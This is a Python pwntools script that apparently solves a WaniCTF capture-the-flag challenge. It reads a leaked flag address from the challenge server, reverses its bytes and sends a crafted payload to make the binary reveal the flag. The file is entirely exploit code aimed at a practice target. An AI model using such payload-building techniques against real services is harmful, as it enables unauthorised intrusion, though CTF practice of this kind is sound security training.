#!/usr/bin/env python3

from pwn import *
import binascii
exe = ELF("./chall_patched")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("chal-lz56g6.wanictf.org", 9004)

    return r


def main():
    r = conn()
    r.recvuntil(b"flag = ")
    received_address=r.recvline().strip()[2:]
    print(received_address)
    print(binascii.unhexlify(received_address))
    flag_address=binascii.unhexlify(received_address)[::-1]
    print(flag_address)
    payload= b"___ "*3 + flag_address + b" gg"
    print(payload)
    with open("payload","wb") as file:
        file.write(payload)
    
    r.sendline(payload)
    r.interactive()



if __name__ == "__main__":
    main()
